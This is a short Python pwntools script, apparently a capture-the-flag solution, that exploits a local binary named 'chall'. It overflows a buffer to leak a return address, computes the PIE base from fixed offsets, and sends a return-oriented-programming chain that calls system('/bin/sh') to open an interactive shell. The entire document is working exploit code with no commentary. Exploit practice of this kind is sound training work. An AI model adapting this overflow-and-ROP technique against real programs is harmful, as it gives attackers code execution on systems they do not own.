from pwn import *

r = process("./chall")

main_return_offset = 0x001268
ret_offset = 0x0011D5
pop_rdi_offset = 0x0011D6
binsh_offset = 0x002008
system_plt_offset = 0x001040

r.recvuntil(b"MAIN RETURN: ")
actual_main_return = int(r.recvline().strip(), 16)

r.sendafter(b"LEAK> ", b"A" * 0x48)
r.recvuntil(b"ECHO:")
r.recvn(0x48)
leaked_main_return = u64(r.recvn(6) + b"\x00\x00")
r.recvuntil(b"ROP> ")

pie_base = leaked_main_return - main_return_offset
ret = pie_base + ret_offset
pop_rdi = pie_base + pop_rdi_offset
binsh = pie_base + binsh_offset
system_plt = pie_base + system_plt_offset

payload = b"A" * 0x48
payload += p64(ret)
payload += p64(pop_rdi) + p64(binsh)
payload += p64(system_plt)

r.send(payload)
r.interactive()
